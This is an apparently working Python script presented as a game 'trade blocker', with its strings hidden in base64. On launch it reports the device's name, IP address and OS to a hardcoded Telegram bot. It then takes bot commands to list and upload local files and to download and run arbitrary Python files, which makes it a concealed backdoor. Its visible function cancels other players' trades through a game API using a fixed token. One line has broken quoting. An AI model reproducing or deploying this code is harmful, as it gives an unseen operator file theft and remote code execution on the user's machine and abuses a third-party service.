#!/usr/bin/env python3
import base64
import requests
import time
import json
import socket
import platform
import threading
import subprocess
import sys
import os
import tempfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import glob
import select

def d(s):
    return base64.b64decode(s.encode()).decode()

e0 = d("ODQ5NzkwMzE2MjpBQUhsdFd6MXJBU2FMRTVEaERnTkNDNHk5YUxUN2VkR0plWQo=")
e1 = d("NTE1MDQwMzM3Nwo=")
e2 = d("aHR0cHM6Ly9hcGkuZWZlemdhbWVzLmNvbS92MQ==")
e3 = d("aHR0cHM6Ly9hcGktcHJvamVjdC03OTUyNjcyNzI5LmZpcmViYXNlaW8uY29t")
e4 = 50
e5 = 10
e6 = 5

e7 = 0
e8 = d("Tm9uZQ==")
e9 = d("Tm9uZQ==")
e10 = d("Tm9uZQ==")
e11 = d("Tm9uZQ==")
e12 = True
e13 = None
e14 = None
e15 = None
e16 = None
e17 = time.time()
e18 = 0
e19 = {}
e20 = {}

def f0(token, text):
    url = d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + token + d("L3NlbmRNZXNzYWdl")
    try:
        cid = int(d(e1))
        requests.post(url, data={'chat_id': cid, 'text': text}, timeout=3)
    except:
        pass

def f1(token, path):
    url = d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + token + d("L3NlbmREb2N1bWVudA==")
    try:
        cid = int(d(e1))
        with open(path, 'rb') as f:
            files = {'document': f}
            requests.post(url, data={'chat_id': cid}, files=files, timeout=10)
    except:
        pass

def f2(token, off):
    url = d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + token + d("L2dldFVwZGF0ZXM=")
    try:
        r = requests.get(url, params={'timeout': 5, 'offset': off}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get('ok') and data.get('result'):
                return data['result']
    except:
        pass
    return []

def f3(token, fid, dst):
    u1 = d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + token + d("L2dldEZpbGU=")
    try:
        r = requests.get(u1, params={'file_id': fid}, timeout=5)
        if r.status_code == 200:
            fp = r.json()['result']['file_path']
            u2 = d("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2ZpbGUvYm90Lw==") + token + '/' + fp
            r2 = requests.get(u2, timeout=30)
            if r2.status_code == 200:
                with open(dst, 'wb') as f:
                    f.write(r2.content)
                return True
    except:
        pass
    return False

def f4():
    global e14, e15, e16, e13
    e14 = platform.node()
    e16 = f"{platform.system()} {platform.release()}"
    try:
        e15 = requests.get(d("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn"), timeout=5).text
    except:
        e15 = d("dW5rbm93bg==")
    e13 = e14.replace('.', '_') + '_' + str(int(time.time()))
    return e13, e14, e15, e16

def f5(token):
    f4()
    m = d("0J3QvtCy0L7QtSDRg9GB0YLRgNC+0LnRgdGC0LLQviDQt9Cw0YDQtdCz0LjRgdGC0YDQuNGA0L7QstCw0L3QvgpJRDog") + e13 + d("Cg0K0JjQvNGPOiA=") + e14 + d("CklQOiA=") + e15 + d("Ci3QodCe0LU6IA==") + e16
    f0(token, m)

def f6(token):
    while True:
        time.sleep(e5)
        if e13:
            f0(token, d("0J/Rg9C70YzRgSA=") + e13)

def f7(pid, oid):
    url = f"{e2}/trades/consumeOffer?token=besttoken&playerID={pid}&offerID={oid}"
    try:
        requests.get(url, timeout=3)
        return True
    except:
        return False

def f8():
    os.system(d("Y2xz") if os.name == 'nt' else d("Y2xlYXI="))
    ut = int(time.time() - e17)
    h, r = divmod(ut, 3600)
    m, s = divmod(r, 60)
    uts = f"{h}h {m}m {s}s"
    st = d("QUNUSVZF") if e12 else d("UEFVU0VEICh2aXN1YWwgb25seSk=")
    print(d("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgkJCSAgICAgICAgVFJBREUgQkxPQ0tFUiB2Mi4wCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpcbkRldmljZTog") + e14 + d("ICgi) + e15 + d("IikKU3RhdHVzOiA=") + st + d("ClRvdGFsIGJsb2NrZWQ6IA==") + str(e7) + d("Cg0KTGFzdCB0cmFkZTogCiAgIFRpbWU6IA==") + e8 + d("CiAgIElEOiA=") + e9 + d("CiAgIFNlbmRlcjog") + e10 + d("CiAgIFNraW5zOiA=") + e11 + d("Cg0KVXBkYXRpbmcgZXZlcnkgc2Vjb25kCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpQcmVzcyBDdHJsK0MgdG8gc3RvcAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0K"))

def f9(s):
    if not s:
        return d("Tm8gc2tpbnM=")
    return s[:30] + d("Li4u") if len(s) > 30 else s

def f10():
    return [f for f in glob.glob(d("Kg==")) if os.path.isfile(f)]

def f11(files):
    if not files:
        return d("0JIg0L/QsNC/0LrQtSDQvdC10YIg0YTQsNC50LvQvtCyLg==")
    lines = []
    for f in files:
        sz = os.path.getsize(f)
        lines.append(f"{f} ({sz} " + d("0LHQsNC50YIp"))
    return "\n".join(lines)

def f12(proc, fn, token):
    while True:
        try:
            if proc.poll() is not None:
                break
            rd = [proc.stdout.fileno()] if proc.stdout else []
            if rd:
                rlist, _, _ = select.select(rd, [], [], 0.1)
                for fd in rlist:
                    line = proc.stdout.readline()
                    if line:
                        line = line.strip()
                        if line and e19.get(fn, {}).get('console_mode', False):
                            f0(token, d("8J+TnyBb") + fn + d("XSA=") + line)
        except:
            break
    if fn in e20:
        del e20[fn]
    if fn in e19:
        e19[fn]['console_mode'] = False
        e19[fn]['output_thread'] = None
    f8()

def f13(token):
    global e18, e12
    while True:
        try:
            ups = f2(token, e18)
            for u in ups:
                e18 = u['update_id'] + 1
                if 'message' in u:
                    msg = u['message']
                    cid = msg['chat']['id']
                    if cid != int(d(e1)):
                        continue
                    if 'document' in msg:
                        fid = msg['document']['file_id']
                        fn = msg['document']['file_name']
                        cap = msg.get('caption', '')
                        if e13 in cap or cap == '':
                            dst = os.path.join(tempfile.gettempdir(), fn)
                            if f3(token, fid, dst):
                                f0(token, d("0KTRhNCw0LnQuyA=") + fn + d("INGD0YHQv9C10YjQvdC+INC30LDQs9GA0YPQttC10L0g0L3QsCA=") + e13)
                            else:
                                f0(token, d("0J7RiNC40LHQutCwINC30LDQs9GA0YPQt9C60Lgg0YTQsNC50LvQsCA=") + fn + d("INC90LAg") + e13)
                    elif 'text' in msg:
                        txt = msg['text']
                        pts = txt.split()
                        if not pts:
                            continue
                        cmd = pts[0].lower()
                        if cmd == '/blocker' and len(pts) >= 2 and pts[1] == 'trade':
                            if len(pts) >= 3:
                                tgt = pts[2]
                                if tgt == e13 or tgt == e14:
                                    if len(pts) >= 4:
                                        if pts[3] == 'on':
                                            e12 = True
                                        elif pts[3] == 'off':
                                            e12 = False
                                    else:
                                        e12 = not e12
                                    st = d("0LLQutC70Y7Rh9C10L3QsA==") if e12 else d("0L/RgNC40L7RgdGC0LDQvdC+0LLQu9C10L3QsA==")
                                    f0(token, d("0JHQu9C+0LrQuNGA0L7QstC60LAg0L3QsCA=") + e13 + d("IA==") + st)
                                else:
                                    pass
                            else:
                                if len(pts) >= 3:
                                    if pts[2] == 'on':
                                        e12 = True
                                    elif pts[2] == 'off':
                                        e12 = False
                                else:
                                    e12 = not e12
                                st = d("0LLQutC70Y7Rh9C10L3QsA==") if e12 else d("0L/RgNC40L7RgdGC0LDQvdC+0LLQu9C10L3QsA==")
                                f0(token, d("0JPRgNC+0LHQsNC70YzQvdCw0Y8g0LrQvtC80LDQvdC00LA6INCx0LvQvtC60LjRgNC+0LLQutCwINC90LAg") + e13 + d("IA==") + st)
                        elif cmd == '/device' and len(pts) >= 2:
                            tgt = pts[1]
                            if tgt == e13 or tgt == e14:
                                ut = int(time.time() - e17)
                                h, r = divmod(ut, 3600)
                                m, s = divmod(r, 60)
                                uts = f"{h}ч {m}м {s}с"
                                st = d("0YDQsNCx0L7RgtCw0LXRgg==") if e12 else d("0L/RgNC40L7RgdGC0LDQvdC+0LLQu9C10L3QsA==")
                                rl = ", ".join(e20.keys()) if e20 else d("0L3QtdGCIg==")
                                inf = (d("8J+RkSDQo9GB0YLRgNC+0LnRgdGC0LLQviDQstCw0YjQtdCz0L4g0L/QvtC70YzQt9C+0LLQsNGC0LXQu9GPICk=") + e14 + d("CiAgICAgICAgICDQp9Cw0YHRgtGMINC60L7QvNC/0YzRjtGC0LXRgNCwICg=") + e13 + d("KQogICAgICAgICDQp9Cw0YHRgtGMINCw0LrRgtC40LLQvdC+0LPQviDQv9C+0LvRjNC30L7QstCw0YLQtdC70Y8g") + e13 + d("KQogICAgICAgICDQmtC+0LvQuNGH0LXRgdGC0LLQviDQtNC+0YHRgtGD0L/QvdGL0YUg0L/RgNC+0YbQtdGB0YHQvtCyICg=") + str(e7) + d("KQogICAgICAgICDQntC/0YDQtdC00LXQu9C10L3QuNC1INC+INC/0YDQvtC40LfQvtC00Y/RidC10Lkg0LrQvtC90YLQsNC60YLQsCAp") + e8 + d("CiAgICAgICAgICDQntGC0L/RgNCw0LLQuNGC0LXQu9GMINGB0L7QvtCx0YnQtdC90LjRjyDRgSDRh9C10YDQtdC3INGC0LXQu9C10LbQvtC90LAg") + d("0LLRgdC1INC/0YDQuNGF0L7QtNC40YI="))
                                f0(token, inf)
                        elif cmd == '/file' and len(pts) >= 3:
                            sc = pts[1].lower()
                            if sc == 'list' and len(pts) >= 3:
                                tgt = pts[2]
                                if tgt == e13 or tgt == e14:
                                    fl = f10()
                                    if fl:
                                        fls = f11(fl)
                                        txt = d("8J+RkSDQpNCw0LnQu9GLINC90LAg0YPRgdGC0YDQvtC50YHRgtCy0LUg") + e14 + d("Og0K") + fls + d("Cg0K0JTRg9C7INGB0LrQsNGH0LjQstCw0L3QuNGPINC40YHQv9C+0LvRjNC30YPQudGC0LUgL2ZpbGUgZ2V0IA==") + e13 + d("INC40LzRjyDRhNCw0LnQu9Cw")
                                        f0(token, txt)
                                    else:
                                        f0(token, d("0JIg0L/QsNC/0LrQtSDRg9GB0YLRgNC+0LnRgdGC0LLQsCA=") + e14 + d("INC90LXRgiDRhNCw0LnQu9C+0LIsINC60L7RgtC+0YDRi9C1INC80L7QttC90L4g0YHQutCw0YfQsNGC0Ywu"))
                            elif sc == 'get' and len(pts) >= 4:
                                tgt = pts[2]
                                fn = pts[3]
                                if tgt == e13 or tgt == e14:
                                    if os.path.exists(fn) and os.path.isfile(fn):
                                        f1(token, fn)
                                    else:
                                        f0(token, d("0KTRhNCw0LnQuyA=") + fn + d("INC90LUg0L3QsNC50LTQtdC9INC90LAg") + e14)
                            elif sc == 'download' and len(pts) >= 4:
                                tgt = pts[2]
                                fn = pts[3]
                                if tgt == e13 or tgt == e14:
                                    f0(token, d("0JPQvtGC0L7QsiDQuiDQv9GA0LjRkdC80YMg0YTQsNC50LvQsCA=") + fn + d("INC00LvRjyA=") + e13)
                            elif sc == 'start' and len(pts) >= 4:
                                tgt = pts[2]
                                fn = pts[3]
                                if tgt == e13 or tgt == e14:
                                    lp = os.path.join(tempfile.gettempdir(), fn)
                                    if not os.path.exists(lp):
                                        lp = fn
                                    if os.path.exists(lp) and os.path.isfile(lp):
                                        try:
                                            proc = subprocess.Popen(
                                                [sys.executable, lp],
                                                stdin=subprocess.PIPE,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.STDOUT,
                                                text=True,
                                                bufsize=1
                                            )
                                            e20[fn] = proc
                                            e19[fn] = {
                                                'pid': proc.pid,
                                                'process': proc,
                                                'console_mode': False,
                                                'output_thread': None
                                            }
                                            thr = threading.Thread(target=f12, args=(proc, fn, token), daemon=True)
                                            thr.start()
                                            e19[fn]['output_thread'] = thr
                                            f0(token, d("0KTRhNCw0LnQuyA=") + fn + d(" INC30LDQv9GD0YnQtdC9INC90LAg") + e13 + d("IChQSUQg") + str(proc.pid) + d("KQ=="))
                                            f8()
                                        except Exception as e:
                                            f0(token, d("0J7RiNC40LHQutCwINC30LDQv9GD0YHQutCwIA==") + fn + d("OiA=") + str(e))
                                    else:
                                        f0(token, d("0KTRhNCw0LnQuyA=") + fn + d("INC90LUg0L3QsNC50LTQtdC9INC90LAg") + e13)
                            elif sc == 'stop' and len(pts) >= 4:
                                tgt = pts[2]
                                fn = pts[3]
                                if tgt == e13 or tgt == e14:
                                    if fn in e20:
                                        try:
                                            e20[fn].terminate()
                                            time.sleep(1)
                                            if e20[fn].poll() is None:
                                                e20[fn].kill()
                                            del e20[fn]
                                            if fn in e19:
                                                e19[fn]['console_mode'] = False
                                                e19[fn]['output_thread'] = None
                                            f0(token, d("0J/RgNC+0YbQtdGB0YEg") + fn + d("INC+0YHRgtCw0L3QvtCy0LvQtdC9INC90LAg") + e13)
                                            f8()
                                        except Exception as e:
                                            f0(token, d("0J7RiNC40LHQutCwINC+0YHRgtCw0L3QvtCy0LrQuA==") + fn + d("OiA=") + str(e))
                                    else:
                                        f0(token, d("0KTRhNCw0LnQuyA=") + fn + d("INC90LUg0LfQsNC/0YPRidC10L0g0L3QsCA=") + e13)
            time.sleep(e6)
        except:
            time.sleep(e6)

def main():
    global e7, e8, e9, e10, e11, e12, e13, e14, e15, e16
    tk = d(e0)
    f5(tk)
    threading.Thread(target=f6, args=(tk,), daemon=True).start()
    threading.Thread(target=f13, args=(tk,), daemon=True).start()
    seen = set()
    f8()
    while True:
        try:
            if not e12:
                time.sleep(1)
                continue
            url = f"{e3}/Trades.json?orderBy=\"ts\"&limitToLast=20"
            resp = requests.get(url, timeout=3)
            trades = resp.json()
            with ThreadPoolExecutor(max_workers=e4) as ex:
                for tid, tdata in trades.items():
                    if tid not in seen:
                        sid = tdata.get('senderID')
                        if sid:
                            ts = tdata.get('ts', 0)
                            e8 = datetime.fromtimestamp(ts/1000).strftime('%H:%M:%S') if ts else '??:??:??'
                            e9 = tid[:12] + "..." if len(tid) > 12 else tid
                            e10 = tdata.get('senderNick', 'unknown')[:20]
                            sk = tdata.get('skinsOffered', '')
                            e11 = f9(sk)
                            msg = (d("0JfQsNCx0LvQvtC60LjRgNC+0LLQsNC9INGC0YDQtdC5LNCa0LDQui0g0LzQvtC90LjRgtC+0YDQuNC90LM=") + e13 + d("CklEOiA=") + tid + d("CiDQktGA0LXQvNGPOiA=") + e8 + d("CiDQntGC0L/RgNCw0LLQuNGC0LXQu9GMINC60L7QvNC/0YzRjtGC0LXRgNCw") + tdata.get('senderNick', d('0L3QtdC40LfQstC10YHRgtC90L4=')) + d("CiDQodC60LjQvdGL0L7Qv9Cw0YfQtdCy0LDQvdC40Y8=") + f9(sk))
                            f0(tk, msg)
                            ex.submit(f7, sid, tid)
                            seen.add(tid)
                            e7 += 1
                            f8()
            time.sleep(1)
        except KeyboardInterrupt:
            print(d("CgpUcmFkZSBibG9ja2VyIHN0b3BwZWQK"))
            f0(tk, d("0JHQu9C+0LrQuNGA0L7QstGJ0LjQuiDQvtGB0YLQsNC90L7QstC70LXQvSA=") + e13)
            break
        except:
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(d("CgpUcmFkZSBibG9ja2VyIHN0b3BwZWQK"))
